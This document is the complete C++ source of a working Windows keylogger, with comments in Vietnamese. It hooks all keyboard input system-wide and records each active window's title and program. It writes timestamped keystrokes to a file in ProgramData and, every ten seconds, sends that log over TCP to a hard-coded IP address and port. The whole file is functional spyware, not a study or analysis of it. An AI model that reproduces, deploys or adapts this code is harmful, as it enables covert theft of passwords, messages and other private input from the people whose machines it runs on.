#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <psapi.h>
#include <unistd.h>
#include <string>
#include <unordered_map>
#include <chrono>
#include <thread>
#include <atomic>
#include <mutex>
#include <fstream>
#include <sstream>
#include <ctime>

using namespace std;

using Clock = std::chrono::steady_clock;
std::atomic<bool> running{true};
std::atomic<Clock::time_point> lastKeyTime;

string titles="";
string title_exe="";
const string outfile = "C:\\ProgramData\\log.txt";
enum class KeyAction { Press, Release };

struct WindowContext {
    std::string appName;      
    std::string windowTitle;  
};

struct KeyboardEvent {
    int keyName;          
    KeyAction action;       
    long long timestamp_ms;  
};

struct KeyboardState {
    bool shift = false;
    bool caps  = false;
    bool ctrl  = false;
    bool alt   = false;
};


class KeyMapper {    // lớp này dùng để mapp các VK_key sang ký tự char
public:
    unordered_map<int, char> normal = {
    {'0', '0'}, {'1', '1'}, {'2', '2'}, {'3', '3'}, {'4', '4'},
    {'5', '5'}, {'6', '6'}, {'7', '7'}, {'8', '8'}, {'9', '9'},
    {'A', 'a'}, {'B', 'b'}, {'C', 'c'}, {'D', 'd'}, {'E', 'e'},
    {'F', 'f'}, {'G', 'g'}, {'H', 'h'}, {'I', 'i'}, {'J', 'j'},
    {'K', 'k'}, {'L', 'l'}, {'M', 'm'}, {'N', 'n'}, {'O', 'o'},
    {'P', 'p'}, {'Q', 'q'}, {'R', 'r'}, {'S', 's'}, {'T', 't'},
    {'U', 'u'}, {'V', 'v'}, {'W', 'w'}, {'X', 'x'}, {'Y', 'y'},
    {'Z', 'z'}, {VK_SPACE,' '},
    {VK_OEM_COMMA, ','},
    {VK_OEM_PERIOD, '.'},
    {VK_OEM_2, '/'},
    {VK_OEM_1, ';'},
    {VK_OEM_7, '\''},
    {VK_OEM_4, '['},
    {VK_OEM_6, ']'},
    {VK_OEM_5, '\\'},
    {VK_OEM_MINUS, '-'},
    {VK_OEM_PLUS, '='}
    };

    unordered_map<int, char> shifted = {
    {'1','!'}, {'2','@'}, {'3','#'}, {'4','$'}, {'5','%'},
    {'6','^'}, {'7','&'}, {'8','*'}, {'9','('}, {'0',')'},
    {VK_OEM_COMMA, '<'},
    {VK_OEM_PERIOD, '>'},
    {VK_OEM_2, '?'},
    {VK_OEM_1, ':'},
    {VK_OEM_7, '"'},
    {VK_OEM_4, '{'},
    {VK_OEM_6, '}'},
    {VK_OEM_5, '|'},
    {VK_OEM_MINUS, '_'},
    {VK_OEM_PLUS, '+'}
    };

    bool isPrintable(const int& key) const {
        return normal.count(key);
    }

    char mapChar(const int& key, const KeyboardState& st) const {  // hàm này kiểm tra shift hoặc caplocks có bật không nếu có thì lên hoa chữ cái
        // For letters: shift XOR caps -> uppercase
        char c = normal.at(key);
        bool isLetter = (c >= 'a' && c <= 'z');
        bool upper = st.shift ^ st.caps;

        if (!isLetter) {
            //cout<<"here shifft\n";
            if (st.shift && shifted.count(key)) return shifted.at(key);
            return c;
        }
        return upper ? (char)toupper((unsigned char)c) : c;
    }
};

class TextBuffer { // lớp này dùng để khởi tạo buffer để lưu các ký tự khi người dùng nhấn bàn phím
    string buf;
public:
    void append(char c) { buf.push_back(c); }
    void backspace() { if (!buf.empty()) buf.pop_back(); }
    void clear() { buf.clear(); }
    bool empty() const { return buf.empty(); }
    const string& str() const { return buf; }
};

class WindowContextProvider {
public:
    WindowContext getActiveWindow()
    {
        WindowContext ctx;

        ctx.windowTitle = titles;        // hàm này dùng để lấy context như là process name, title 
        ctx.appName     = title_exe; 

        return ctx;
    }
};

string nowAsString() { // lấy thời gian
    auto now = chrono::system_clock::now();
    time_t t = chrono::system_clock::to_time_t(now);

    tm tm_info;
    localtime_s(&tm_info, &t);   

    char buf[32];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tm_info);

    return string(buf);
}

class Processor {
    KeyboardState st;
    TextBuffer buffer;
    KeyMapper mapper;
    ofstream out;
    mutex mtx;
    WindowContextProvider windowProvider;

public:
    explicit Processor(const string& outFile) : out(outFile, ios::app) {
        if (!out) throw runtime_error("Cannot open output file");
    }

    void handle(const KeyboardEvent& ev) {
        lock_guard<mutex> lock(mtx);
        updateState(ev);

        if (ev.action != KeyAction::Press) return;
        lastKeyTime.store(Clock::now(), memory_order_relaxed);

        if (ev.keyName == VK_BACK) { buffer.backspace(); return; }
        if (ev.keyName == VK_RETURN)     {  flushLineUnlocked(); return; }

        if (st.ctrl) {
            if (ev.keyName == int('C')) out << "[CTRL+C]";
            else if (ev.keyName == int('V')) out << "[CTRL+V]";
            return;
        }

        if (mapper.isPrintable(ev.keyName)) {
            char c = mapper.mapChar(ev.keyName, st);
            //cout<<c<<"\n";
            buffer.append(c);
        }
        else{
            cout<<"No found"<<"\n";
        }
    }

    void flushLine() {
       lock_guard<mutex> lock(mtx);
       flushLineUnlocked();
    }
    void flushLineUnlocked() {
    if (!buffer.empty()) {
        string timeStr = nowAsString();
        WindowContext ctx = windowProvider.getActiveWindow();
        cout << buffer.str() << "\n";
        out << "[" << timeStr << " | " << ctx.appName<< " | " << ctx.windowTitle << "]\n";
        out << buffer.str() << "\n\n";
        out.flush();
        buffer.clear();
    }
}

private:
    void updateState(const KeyboardEvent& ev) {
        auto pressed = (ev.action == KeyAction::Press);

        if (ev.keyName == VK_LSHIFT || ev.keyName == VK_RSHIFT) st.shift = pressed;
        else if (ev.keyName == VK_LCONTROL || ev.keyName == VK_RCONTROL) st.ctrl = pressed;
        else if (ev.keyName == VK_LMENU  || ev.keyName == VK_RMENU)  st.alt  = pressed;
        else if (ev.keyName == VK_CAPITAL && pressed) st.caps = !st.caps;
    }
};

static Processor p(outfile);
void sessionTimerThread(Processor& processor) {
    using namespace std::chrono_literals;

    while (running.load()) {
        this_thread::sleep_for(500ms);

        auto now  = Clock::now();
        auto last = lastKeyTime.load();

        if (now - last > 5s) {
            processor.flushLine();
            lastKeyTime.store(now);
        }
    }
}


void CALLBACK winEventProc(HWINEVENTHOOK,DWORD event,HWND hwnd,LONG,LONG,DWORD,DWORD)
{
    if(event != EVENT_SYSTEM_FOREGROUND)
    {
        return;
    }
    char title[256] = {0};
    GetWindowTextA(hwnd,title,sizeof(title));

    DWORD pid;
    GetWindowThreadProcessId(hwnd,&pid);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,pid);

    char exe[MAX_PATH] = {0};
    if(hProcess)
    {
        GetModuleFileNameExA(hProcess, NULL, exe, MAX_PATH);
        CloseHandle(hProcess);
    }
    string titleStr(title);
    titles = titleStr;

    string exestr(exe);
    title_exe = exestr;

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        //cout<< "over here"<<"\n";
        KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        KeyboardEvent ev;
        ev.keyName = static_cast<int>(kb->vkCode);
        //cout<<ev.keyName << "\n";
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            ev.action = KeyAction::Press;
            //cout<<"key press"<<"\n";
        }
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        {
             ev.action = KeyAction::Release;
             //cout<<"key release"<<"\n";
        }
        ev.timestamp_ms = -1;
        p.handle(ev);
        
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


void sendLogThread(const std::string& logfile,
                   const std::string& serverIp,
                   int serverPort)
{
    using namespace std::chrono_literals;

    while (running.load()) {
        std::this_thread::sleep_for(10s);

        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        //cout << "not pass continute\n";

        if (sock == INVALID_SOCKET) {
            cout << "socket failed: " << WSAGetLastError() << "\n";
            continue;
        }

        //cout << "pass continute\n";

        sockaddr_in serv{};
        serv.sin_family = AF_INET;
        serv.sin_port   = htons(serverPort);
        inet_pton(AF_INET, serverIp.c_str(), &serv.sin_addr);

        if (connect(sock, (sockaddr*)&serv, sizeof(serv)) == SOCKET_ERROR) {
            cout << "cannot connect: " << WSAGetLastError() << "\n";
            closesocket(sock);
            continue;
        }

        std::ifstream in(logfile);
        if (!in) {
            closesocket(sock);
            continue;
        }

        std::string line;
        while (std::getline(in, line)) {
            line += "\n";
            send(sock, line.c_str(), (int)line.size(), 0);
        }

        in.close();
        closesocket(sock);
    }
}




int main()
{  
    HANDLE hMutex = CreateMutexW(
        nullptr,
        FALSE,
        L"Global\\DemoSpawnAgentMutex"
    );

    if (hMutex == nullptr) return 1;

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // đã có chương trình khác chạy
        return 0;
    }
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        std::cerr << "WSAStartup failed\n";
    }
    string serverIp = "10.177.191.158";
    int serverPort = 9001;
    lastKeyTime.store(Clock::now());
    thread netThread(sendLogThread,outfile,serverIp,serverPort);
    thread timer(sessionTimerThread, ref(p));
    HWINEVENTHOOK hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND,EVENT_SYSTEM_FOREGROUND,NULL,
        winEventProc,
        0, 0,
        WINEVENT_OUTOFCONTEXT
    );
    HHOOK keyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    running.store(false);
    p.flushLine();
    timer.join();
    netThread.join();
    CloseHandle(hMutex);
    return 0;
}